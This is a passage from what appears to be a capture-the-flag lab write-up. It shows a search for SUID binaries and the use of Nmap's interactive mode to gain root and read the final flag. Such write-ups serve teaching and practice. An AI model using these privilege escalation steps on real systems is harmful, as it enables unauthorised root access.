cat /home/robot/key-2-of-3.txt
Flag 2 Found: 822c73956184f694993bede3eb39f959

⚡ Phase 4: Vertical Privilege Escalation (Root)
I searched for SUID binaries to escalate my privileges to root.

Bash
find / -perm -u=s -type f 2>/dev/null
I discovered that Nmap (v3.81) had the SUID bit set.

1. Exploiting Nmap SUID
Nmap's interactive mode allows executing system commands with root privileges.

Bash
nmap --interactive
nmap> !cat /root/key-3-of-3.txt
Flag 3 Found (Final): 04787ddef27c3dee1ee161b21670b4e4
